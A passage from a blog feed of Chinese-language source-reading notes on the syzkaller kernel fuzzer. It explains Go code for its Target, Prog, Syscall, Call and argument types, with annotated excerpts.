class="line">key := OS + <span class="string">"/"</span> + arch</span><br><span class="line"><span class="comment">//从全局变量中获取target类型对象</span></span><br><span class="line">target := targets[key]</span><br><span class="line"><span class="comment">//target类型对象不存在 不支持的target类型</span></span><br><span class="line"><span class="keyword">if</span> target == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">var</span> supported []<span class="keyword">string</span></span><br><span class="line"><span class="keyword">for</span> _, t := <span class="keyword">range</span> targets &#123;</span><br><span class="line">supported = <span class="built_in">append</span>(supported, fmt.Sprintf(<span class="string">"%v/%v"</span>, t.OS, t.Arch))</span><br><span class="line">&#125;</span><br><span class="line">sort.Strings(supported)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">"unknown target: %v (supported: %v)"</span>, key, supported)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//加锁调用lazyInit 进行相关初始化</span></span><br><span class="line">target.init.Do(target.lazyInit)</span><br><span class="line"><span class="keyword">return</span> target, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="初始化Target中的Consts、系统调用和Resources等"><a href="#初始化Target中的Consts、系统调用和Resources等" class="headerlink" title="初始化Target中的Consts、系统调用和Resources等"></a>初始化Target中的Consts、系统调用和Resources等</h5><p>初始化Target类型中相关的系统调用资源等<br>prog/target.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//初始化initTarget、initArch、ConstMap等</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(target *Target)</span> <span class="title">lazyInit</span><span class="params">()</span></span> &#123;</span><br><span class="line">target.SanitizeCall = <span class="function"><span class="keyword">func</span><span class="params">(c *Call)</span></span> &#123;&#125;</span><br><span class="line">target.initTarget()</span><br><span class="line">target.initArch(target)</span><br><span class="line">target.ConstMap = <span class="literal">nil</span> <span class="comment">// currently used only by initArch</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="初始化相关系统调用、资源的核心函数"><a href="#初始化相关系统调用、资源的核心函数" class="headerlink" title="初始化相关系统调用、资源的核心函数"></a>初始化相关系统调用、资源的核心函数</h5><p>初始化相关的资源和系统调用、对应目标系统支持的页大小、指针大小等信息<br>prog/target.go中定义<br>其中不同的Target类型在syzkaller/sys下定义,如linux系统amd64体系结构在syzkaller/sys/linux/amd64.go下,包含了对应的资源、系统调用相关信息</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(target *Target)</span> <span class="title">initTarget</span><span class="params">()</span></span> &#123;</span><br><span class="line">target.ConstMap = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">uint64</span>)</span><br><span class="line"><span class="keyword">for</span> _, c := <span class="keyword">range</span> target.Consts &#123;</span><br><span class="line">target.ConstMap[c.Name] = c.Value</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化对应的资源(syzkaller/sys/中定义了和目标系统体系结构相关的资源)</span></span><br><span class="line">target.resourceMap = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]*ResourceDesc)</span><br><span class="line"><span class="keyword">for</span> _, res := <span class="keyword">range</span> target.Resources &#123;</span><br><span class="line">target.resourceMap[res.Name] = res</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">keyedStructs := <span class="built_in">make</span>(<span class="keyword">map</span>[StructKey]*StructDesc)</span><br><span class="line"><span class="keyword">for</span> _, desc := <span class="keyword">range</span> target.Structs &#123;</span><br><span class="line">keyedStructs[desc.Key] = desc.Desc</span><br><span class="line">&#125;</span><br><span class="line">target.Structs = <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化系统调用(syzkaller/sys/中定义了和目标系统体系结构相关的系统调用)</span></span><br><span class="line">target.SyscallMap = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]*Syscall)</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> target.Syscalls &#123;</span><br><span class="line">c.ID = i</span><br><span class="line">target.SyscallMap[c.Name] = c</span><br><span class="line">ForeachType(c, <span class="function"><span class="keyword">func</span><span class="params">(t0 Type)</span></span> &#123;</span><br><span class="line"><span class="keyword">switch</span> t := t0.(<span class="keyword">type</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> *ResourceType:</span><br><span class="line">t.Desc = target.resourceMap[t.TypeName]</span><br><span class="line"><span class="keyword">if</span> t.Desc == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">"no resource desc"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> *StructType:</span><br><span class="line">t.StructDesc = keyedStructs[t.Key]</span><br><span class="line"><span class="keyword">if</span> t.StructDesc == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">"no struct desc"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> *UnionType:</span><br><span class="line">t.StructDesc = keyedStructs[t.Key]</span><br><span class="line"><span class="keyword">if</span> t.StructDesc == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">"no union desc"</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">target.resourceCtors = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>][]*Syscall)</span><br><span class="line"><span class="keyword">for</span> _, res := <span class="keyword">range</span> target.Resources &#123;</span><br><span class="line">target.resourceCtors[res.Name] = target.calcResourceCtors(res.Kind, <span class="literal">false</span>)</span><br><span class="line">&#125;</span><br><span class="line">initAnyTypes(target)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>syzkaller/sys/linux/amd64.go中定义的系统调用和资源相关的demo</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">系统调用相关的定义:</span><br><span class="line"><span class="keyword">var</span> syscalls_amd64 = []*Syscall&#123;</span><br><span class="line">        &#123;NR: <span class="number">43</span>, Name: <span class="string">"accept"</span>, CallName: <span class="string">"accept"</span>, Args: []Type&#123;</span><br><span class="line">                &amp;ResourceType&#123;TypeCommon: TypeCommon&#123;TypeName: <span class="string">"sock"</span>, FldName: <span class="string">"fd"</span>, TypeSize: <span class="number">4</span>&#125;&#125;,</span><br><span class="line">                &amp;PtrType&#123;TypeCommon: TypeCommon&#123;TypeName: <span class="string">"ptr"</span>, FldName: <span class="string">"peer"</span>, TypeSize: <span class="number">8</span>, IsOptional: <span class="literal">true</span>&#125;, Type: &amp;UnionType&#123;Key: StructKey&#123;Name: <span class="string">"sockaddr_storage"</span>, Dir: <span class="number">1</span>&#125;&#125;&#125;,</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">资源相关的定义:</span><br><span class="line"><span class="keyword">var</span> resources_amd64 = []*ResourceDesc&#123;</span><br><span class="line">            &#123;Name: <span class="string">"assoc_id"</span>, Type: &amp;IntType&#123;IntTypeCommon: IntTypeCommon&#123;TypeCommon: TypeCommon&#123;TypeName: <span class="string">"int32"</span>, TypeSize: <span class="number">4</span>&#125;&#125;&#125;, Kind: []<span class="keyword">string</span>&#123;<span class="string">"assoc_id"</span>&#125;, Values: []<span class="keyword">uint64</span>&#123;<span class="number">0</span>&#125;&#125;,</span><br><span class="line">            </span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="Prog类型"><a href="#Prog类型" class="headerlink" title="Prog类型"></a>Prog类型</h3><p>Prog类型是一个很关键的类型,一个fuzzer(executor——Linux下是executor_linux,在syzkaller/syz-fuzzer目录下定义)执行中保留有一个Prog类型。<br>Prog类型包含了Target类型——目标系统相关的信息以及Call切片数组,这里该Call数组是生成的一组系统调用或者是经过变异后的一组系统调用,用于fuzzer去执行该系统调用数组,然后检测是否出现crash或者hangup等信号。<br>我们知道Call实际上就是一个系统调用完整的包装(包含参数类型、参数值和返回值等信息)<br>prog/prog.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Prog <span class="keyword">struct</span> &#123;</span><br><span class="line">Target *Target                      <span class="comment">//目标系统信息的描述</span></span><br><span class="line">Calls  []*Call                      <span class="comment">//包含一组生成或者变异的系统调用,用于进行实际的fuzz</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Prog类型几个重要的函数"><a href="#Prog类型几个重要的函数" class="headerlink" title="Prog类型几个重要的函数"></a>Prog类型几个重要的函数</h4><h5 id="插入一个系统调用"><a href="#插入一个系统调用" class="headerlink" title="插入一个系统调用"></a>插入一个系统调用</h5><p>向Prog中的系统调用切片数组中添加一个新的系统调用,插入到指定的系统调用之前,该系统调用可能是生成的也可能是变异得来的<br>通过参数找到要插入新的系统调用的位置,然后插入新的系统调用<br>prog/prog.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Prog)</span> <span class="title">insertBefore</span><span class="params">(c *Call, calls []*Call)</span></span> &#123;</span><br><span class="line">idx := <span class="number">0</span><span class="comment">//c在系统调用切片数组中的位置</span></span><br><span class="line"><span class="comment">//查找到系统调用c在当前的prog中系统调用切片数组中的位置</span></span><br><span class="line"><span class="keyword">for</span> ; idx &lt; <span class="built_in">len</span>(p.Calls); idx++ &#123;</span><br><span class="line"><span class="keyword">if</span> p.Calls[idx] == c &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> newCalls []*Call</span><br><span class="line"><span class="comment">//插入前 .... p.Calls[:idx] c p.Calls[idx+1] ....</span></span><br><span class="line"><span class="comment">//插入后 .... p.Calls[:idx] calls c p.Calls[idx+1]....</span></span><br><span class="line">newCalls = <span class="built_in">append</span>(newCalls, p.Calls[:idx]...)</span><br><span class="line">newCalls = <span class="built_in">append</span>(newCalls, calls...)</span><br><span class="line"><span class="keyword">if</span> idx &lt; <span class="built_in">len</span>(p.Calls) &#123;</span><br><span class="line">newCalls = <span class="built_in">append</span>(newCalls, p.Calls[idx])</span><br><span class="line">newCalls = <span class="built_in">append</span>(newCalls, p.Calls[idx+<span class="number">1</span>:]...)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//更新当前prog的系统调用为newCalls</span></span><br><span class="line">p.Calls = newCalls</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="删除一个系统调用"><a href="#删除一个系统调用" class="headerlink" title="删除一个系统调用"></a>删除一个系统调用</h5><p>通过传递数组下标,从Prog类型中的系统调用切片数组中删除对应的系统调用<br>prog/prog.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Prog)</span> <span class="title">removeCall</span><span class="params">(idx <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">c := p.Calls[idx]</span><br><span class="line"><span class="comment">//获取idx对应的系统调用</span></span><br><span class="line"><span class="comment">//遍历idx系统调用的参数并删除</span></span><br><span class="line"><span class="keyword">for</span> _, arg := <span class="keyword">range</span> c.Args &#123;</span><br><span class="line">removeArg(arg)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除系统调用的返回值</span></span><br><span class="line">removeArg(c.Ret)</span><br><span class="line"><span class="comment">//删除系统调用</span></span><br><span class="line"><span class="comment">//把切片p.Calls[idx+1:]拷贝到p.Calls[idx]位置开始</span></span><br><span class="line"><span class="built_in">copy</span>(p.Calls[idx:], p.Calls[idx+<span class="number">1</span>:])<span class="comment">//删除系统调用p.Calls[idx]</span></span><br><span class="line">p.Calls = p.Calls[:<span class="built_in">len</span>(p.Calls)<span class="number">-1</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这里只是简单的总结了下Target类型、Prog类型和几个比较重要的函数,Target和Prog类型还包含别的函数以及和fuzz相关的函数,将会在后面进行更详细的介绍</p></the>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;本文摘要——&quot;&gt;&lt;a href=&quot;#本文摘要——&quot; class=&quot;headerlink&quot; title=&quot; 本文摘要——   &quot;&gt;&lt;/a&gt;&lt;strong&gt; 本文摘要—— syzkaller_source_read_target_type_and_function &lt;/strong&gt; &lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页:摘要=&quot;&quot;&gt;&lt;/excerpt&gt;&lt;/h1&gt;
    
    </summary>
    
    
      <category term="syzkaller" scheme="https://0x9k.club/tags/syzkaller/"/>
    
      <category term="fuzzer" scheme="https://0x9k.club/tags/fuzzer/"/>
    
  </entry>
  
  <entry>
    <title>syzkaller_source_read_syscall_type_and_function</title>
    <link href="https://0x9k.club/posts/uncategorized/2018-05-02-syzkaller_source_read_syscall_type_and_function.html"/>
    <id>https://0x9k.club/posts/uncategorized/2018-05-02-syzkaller_source_read_syscall_type_and_function.html</id>
    <published>2018-05-02T15:38:06.000Z</published>
    <updated>2018-05-02T15:38:06.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="本文摘要——"><a href="#本文摘要——" class="headerlink" title=" 本文摘要——   "></a><strong> 本文摘要—— syzkaller_source_read_syscall_type_and_function </strong> <excerpt in="" index="" |="" 首页:摘要=""></excerpt></h1><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><h2 id="syzkaller源码阅读之系统调用相关的类型和函数"><a href="#syzkaller源码阅读之系统调用相关的类型和函数" class="headerlink" title="syzkaller源码阅读之系统调用相关的类型和函数"></a>syzkaller源码阅读之系统调用相关的类型和函数</h2><h3 id="系统调用相关的类型"><a href="#系统调用相关的类型" class="headerlink" title="系统调用相关的类型"></a>系统调用相关的类型</h3><p>系统调用描述类型Syscall定义:包含系统调用号NR、系统调用参数类型和返回值类型等<br>在prog/types.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Syscall <span class="keyword">struct</span> &#123;</span><br><span class="line">ID       <span class="keyword">int</span>            <span class="comment">//ID也是系统调用号</span></span><br><span class="line">NR       <span class="keyword">uint64</span>         <span class="comment">//系统调用号</span></span><br><span class="line">Name     <span class="keyword">string</span>         <span class="comment">//名字</span></span><br><span class="line">CallName <span class="keyword">string</span>         <span class="comment">//函数调用名</span></span><br><span class="line">Args     []Type         <span class="comment">//系统调用参数类型切片数组</span></span><br><span class="line">Ret      Type           <span class="comment">//系统调用返回值类型</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整的系统调用类型:Syscall中只包含了系统调用参数的类型和返回值类型<br>prog/prog.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Call <span class="keyword">struct</span> &#123;</span><br><span class="line">Meta *Syscall</span><br><span class="line">Args []Arg              <span class="comment">//系统调用参数值切片数组</span></span><br><span class="line">Ret  Arg                <span class="comment">//系统调用返回值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="系统调用的参数"><a href="#系统调用的参数" class="headerlink" title="系统调用的参数"></a>系统调用的参数</h3><h4 id="系统调用参数模式"><a href="#系统调用参数模式" class="headerlink" title="系统调用参数模式"></a>系统调用参数模式</h4><p>系统调用参数模式分为:输入参数、输出参数、即是输入也是输出参数<br>在prog/types.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Dir <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义参数模式</span></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">DirIn Dir = <span class="literal">iota</span>         <span class="comment">//0 输入参数</span></span><br><span class="line">DirOut                  <span class="comment">//1 输出参数</span></span><br><span class="line">DirInOut               <span class="comment">//2 即是输入参数也是输出参数</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>以字符串形式返回系统调用参数模式:输入参数——in、输出参数——out、即是输入参数也是输出参数——inout<br>在prog/types.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(dir Dir)</span> <span class="title">String</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line"><span class="keyword">switch</span> dir &#123;</span><br><span class="line"><span class="keyword">case</span> DirIn:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"in"</span></span><br><span class="line"><span class="keyword">case</span> DirOut:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"out"</span></span><br><span class="line"><span class="keyword">case</span> DirInOut:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"inout"</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">"unknown dir"</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="系统调用参数类型接口"><a href="#系统调用参数类型接口" class="headerlink" title="系统调用参数类型接口"></a>系统调用参数类型接口</h4><h5 id="系统调用参数接口"><a href="#系统调用参数接口" class="headerlink" title="系统调用参数接口"></a>系统调用参数接口</h5><p>参数类型接口需要实现两个方法:返回参数的类型——Type()和参数的大小——Size()<br>prog/prog.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Arg <span class="keyword">interface</span> &#123;</span><br><span class="line">Type() Type             <span class="comment">//返回参数的类型</span></span><br><span class="line">Size() <span class="keyword">uint64</span>           <span class="comment">//返回参数的大小</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="系统调用参数类型接口-1"><a href="#系统调用参数类型接口-1" class="headerlink" title="系统调用参数类型接口"></a>系统调用参数类型接口</h5><p>参数类型接口需要实现如下几个方法:<br>prog/types.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Type <span class="keyword">interface</span> &#123;</span><br><span class="line">String() <span class="keyword">string</span></span><br><span class="line">Name() <span class="keyword">string</span></span><br><span class="line">FieldName() <span class="keyword">string</span></span><br><span class="line">Dir() Dir</span><br><span class="line">Optional() <span class="keyword">bool</span></span><br><span class="line">Default() <span class="keyword">uint64</span></span><br><span class="line">Varlen() <span class="keyword">bool</span></span><br><span class="line">Size() <span class="keyword">uint64</span></span><br><span class="line">BitfieldOffset() <span class="keyword">uint64</span></span><br><span class="line">BitfieldLength() <span class="keyword">uint64</span></span><br><span class="line">BitfieldMiddle() <span class="keyword">bool</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="通用参数类型类型"><a href="#通用参数类型类型" class="headerlink" title="通用参数类型类型"></a>通用参数类型类型</h5><p>定义通用参数类型:只包含一个成员变量,参数接口类型Type<br>prog/prog.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> ArgCommon <span class="keyword">struct</span> &#123;</span><br><span class="line">typ Type</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现参数接口的Type方法<br>prog/prog.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(arg *ArgCommon)</span> <span class="title">Type</span><span class="params">()</span> <span class="title">Type</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> arg.typ</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="具体的参数类型"><a href="#具体的参数类型" class="headerlink" title="具体的参数类型"></a>具体的参数类型</h3><p>具体参数类型可以分为一下几个:Const类型参数、指针类型和vma类型的参数、Data类型的参数、Group类型的参数(结构体和数组)、Union类型的参数(联合共用体类型)和Resource类型的参数<br>每一参数类型都包含一个成员变量——通用的参数类型ArgCommon</p><h4 id="Const类型的参数"><a href="#Const类型的参数" class="headerlink" title="Const类型的参数"></a>Const类型的参数</h4><p>Const类型的参数包括下面几个:ConstType,IntType,FlagsType,LenType,ProcType,CsumType和ResourceType</p><p>定义Const类型的参数:Const类型包含Const类型——常量、IntType——int类型、FlagsType——在系统调用中用来表示Flags、LenType——长度、Resource——资源类型、ProcType和CsumType<br>prog/prog.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> ConstArg <span class="keyword">struct</span> &#123;</span><br><span class="line">ArgCommon               <span class="comment">//通用参数类型</span></span><br><span class="line">Val <span class="keyword">uint64</span>              <span class="comment">//参数的值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现Const类型参数的Size()接口方法<br>prog/prog.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(arg *ConstArg)</span> <span class="title">Size</span><span class="params">()</span> <span class="title">uint64</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> arg.typ.Size()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现Const类型的参数返回其值:判断Const类型参数具体是哪一个，并返回其值——第一个是值、第二个是和处理器proc相关、第三个是否为大端模式<br>prog/prog.go中实现</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(arg *ConstArg)</span> <span class="title">Value</span><span class="params">()</span> <span class="params">(<span class="keyword">uint64</span>, <span class="keyword">uint64</span>, <span class="keyword">bool</span>)</span></span> &#123;</span><br><span class="line"><span class="comment">//判断Const参数类型</span></span><br><span class="line"><span class="keyword">switch</span> typ := (*arg).Type().(<span class="keyword">type</span>) &#123;</span><br><span class="line"><span class="comment">//int类型</span></span><br><span class="line"><span class="keyword">case</span> *IntType:</span><br><span class="line"><span class="keyword">return</span> arg.Val, <span class="number">0</span>, typ.BigEndian</span><br><span class="line"><span class="comment">//const类型</span></span><br><span class="line"><span class="keyword">case</span> *ConstType:</span><br><span class="line"><span class="keyword">return</span> arg.Val, <span class="number">0</span>, typ.BigEndian</span><br><span class="line"><span class="comment">//flags类型</span></span><br><span class="line"><span class="keyword">case</span> *FlagsType:</span><br><span class="line"><span class="keyword">return</span> arg.Val, <span class="number">0</span>, typ.BigEndian</span><br><span class="line"><span class="comment">//len类型</span></span><br><span class="line"><span class="keyword">case</span> *LenType:</span><br><span class="line"><span class="keyword">return</span> arg.Val, <span class="number">0</span>, typ.BigEndian</span><br><span class="line"><span class="comment">//csum类型</span></span><br><span class="line"><span class="keyword">case</span> *CsumType:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span>, <span class="literal">false</span></span><br><span class="line"><span class="comment">//Resource资源类型</span></span><br><span class="line"><span class="keyword">case</span> *ResourceType:</span><br><span class="line">t := typ.Desc.Type.(*IntType)</span><br><span class="line"><span class="keyword">return</span> arg.Val, <span class="number">0</span>, t.BigEndian</span><br><span class="line"><span class="comment">//Proc类型</span></span><br><span class="line"><span class="keyword">case</span> *ProcType:</span><br><span class="line"><span class="keyword">if</span> arg.Val == typ.Default() &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span>, <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> typ.ValuesStart + arg.Val, typ.ValuesPerProc, typ.BigEndian</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">panic</span>(fmt.Sprintf(<span class="string">"unknown ConstArg type %#v"</span>, typ))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="指针类型和vma类型的参数"><a href="#指针类型和vma类型的参数" class="headerlink" title="指针类型和vma类型的参数"></a>指针类型和vma类型的参数</h4><p>定义指针类型的参数<br>prog/prog.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> PointerArg <span class="keyword">struct</span> &#123;</span><br><span class="line">ArgCommon</span><br><span class="line">Address <span class="keyword">uint64</span>              <span class="comment">//指针地址</span></span><br><span class="line">VmaSize <span class="keyword">uint64</span>              <span class="comment">//vma大小</span></span><br><span class="line">Res     Arg                 <span class="comment">//指针指向的对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断指针是否为空:指针地址是否为空、vma大小是否为空、指针指向的对象是否为nil<br>prog/prog.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(arg *PointerArg)</span> <span class="title">IsNull</span><span class="params">()</span> <span 